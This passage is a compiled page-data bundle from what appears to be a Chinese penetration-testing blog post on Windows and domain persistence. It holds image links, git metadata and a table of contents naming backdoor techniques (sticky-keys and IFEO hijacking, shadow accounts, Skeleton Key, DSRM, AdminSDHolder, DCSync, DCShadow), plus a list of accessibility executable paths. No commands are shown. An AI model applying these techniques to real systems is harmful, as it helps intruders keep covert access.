sercontent.com/uu2fu3o/blog-picture/main/prive-long/dcsync-adminhash.png\\",\\"https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/prive-long/secretsdump.png\\",\\"https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/prive-long-long/dcshadow.png\\",\\"https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/prive-long-long/hacker-RID.png\\"],\\"dateModified\\":\\"2025-01-15T18:41:02.000Z\\",\\"author\\":[{\\"@type\\":\\"Person\\",\\"name\\":\\"uu2fu3o\\",\\"url\\":\\"https://mister-hope.com\\"}]}"]]},"headers":[{"level":2,"title":"辅助功能镜像劫持","slug":"辅助功能镜像劫持","link":"#辅助功能镜像劫持","children":[{"level":3,"title":"shift后门","slug":"shift后门","link":"#shift后门","children":[]},{"level":3,"title":"映像劫持(IFEO)","slug":"映像劫持-ifeo","link":"#映像劫持-ifeo","children":[]}]},{"level":2,"title":"常见系统后门技术","slug":"常见系统后门技术","link":"#常见系统后门技术","children":[{"level":3,"title":"创建影子账户","slug":"创建影子账户","link":"#创建影子账户","children":[]},{"level":3,"title":"系统服务后门","slug":"系统服务后门","link":"#系统服务后门","children":[]},{"level":3,"title":"计划任务后门","slug":"计划任务后门","link":"#计划任务后门","children":[]},{"level":3,"title":"启动项\\\\注册表键后门","slug":"启动项-注册表键后门","link":"#启动项-注册表键后门","children":[]}]},{"level":2,"title":"事件触发执行","slug":"事件触发执行","link":"#事件触发执行","children":[{"level":3,"title":"利用WMI订阅事件","slug":"利用wmi订阅事件","link":"#利用wmi订阅事件","children":[]},{"level":3,"title":"利用屏幕保护程序","slug":"利用屏幕保护程序","link":"#利用屏幕保护程序","children":[]},{"level":3,"title":"DLL劫持","slug":"dll劫持","link":"#dll劫持","children":[]}]},{"level":2,"title":"常见域后门技术","slug":"常见域后门技术","link":"#常见域后门技术","children":[{"level":3,"title":"创建Skeleton Key域后门","slug":"创建skeleton-key域后门","link":"#创建skeleton-key域后门","children":[]},{"level":3,"title":"创建DSRM域后门","slug":"创建dsrm域后门","link":"#创建dsrm域后门","children":[]},{"level":3,"title":"SID History利用","slug":"sid-history利用","link":"#sid-history利用","children":[]},{"level":3,"title":"利用AdminSDHolder打造域后门","slug":"利用adminsdholder打造域后门","link":"#利用adminsdholder打造域后门","children":[]},{"level":3,"title":"HOOK PasswordChangeNotify","slug":"hook-passwordchangenotify","link":"#hook-passwordchangenotify","children":[]}]},{"level":2,"title":"DCSync攻击技术","slug":"dcsync攻击技术","link":"#dcsync攻击技术","children":[{"level":3,"title":"原理","slug":"原理","link":"#原理","children":[]},{"level":3,"title":"利用DCSync导出域内的hash","slug":"利用dcsync导出域内的hash","link":"#利用dcsync导出域内的hash","children":[]},{"level":3,"title":"利用DCSync进行权限持久化","slug":"利用dcsync进行权限持久化","link":"#利用dcsync进行权限持久化","children":[]},{"level":3,"title":"DCShadow","slug":"dcshadow","link":"#dcshadow","children":[]}]},{"level":2,"title":"总结：","slug":"总结","link":"#总结","children":[]}],"git":{"createdTime":1736966462000,"updatedTime":1736966462000,"contributors":[{"name":"uu2fu3o","username":"uu2fu3o","email":"1027578439@qq.com","commits":1,"url":"https://github.com/uu2fu3o"}]},"readingTime":{"minutes":29.05,"words":8714},"filePathRelative":"渗透测试/内网体系建设/内网权限持久化.md","localizedDate":"2025年1月16日","excerpt":"\\n<h2>辅助功能镜像劫持</h2>\\n<h3>shift后门</h3>\\n<p>利用windows的辅助功能进行后门</p>\\n<p>最常见的按5下shift出现的粘滞键Sethc.exe，还有Windows + U组合键时启动的utilman.exe程序</p>\\n<div class=\\"language- line-numbers-mode\\" data-highlighter=\\"shiki\\" data-ext=\\"\\" data-title=\\"\\" style=\\"--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34\\"><pre class=\\"shiki shiki-themes one-light one-dark-pro vp-code\\"><code><span class=\\"line\\"><span>屏幕键盘： C:\\\\Windows\\\\System32\\\\osk.exe</span></span>\\n<span class=\\"line\\"><span>放大镜： C:\\\\Windows\\\\System32\\\\Magnify.exe</span></span>\\n<span class=\\"line\\"><span>旁白： C:\\\\Windows\\\\System32\\\\Narrator.exe</span></span>\\n<span class=\\"line\\"><span>显示切换器 C:\\\\Windows\\\\System32\\\\DisplaySwitch.exe</span></span>\\n<span class=\\"line\\"><span>应用切换器： C:\\\\Windows\\\\System32\\\\AtBroker.exe</span></span></code></pre>\\n<div class=\\"line-numbers\\" aria-hidden=\\"true\\" style=\\"counter-reset:line-number 0\\"><div class=\\"line-number\\"></div><div class=\\"line-number\\"></div><div class=\\"line-number\\"></div><div class=\\"line-number\\"></div><div class=\\"line-number\\"></div></div></div>","autoDesc":true}');export{k as comp,o as data};
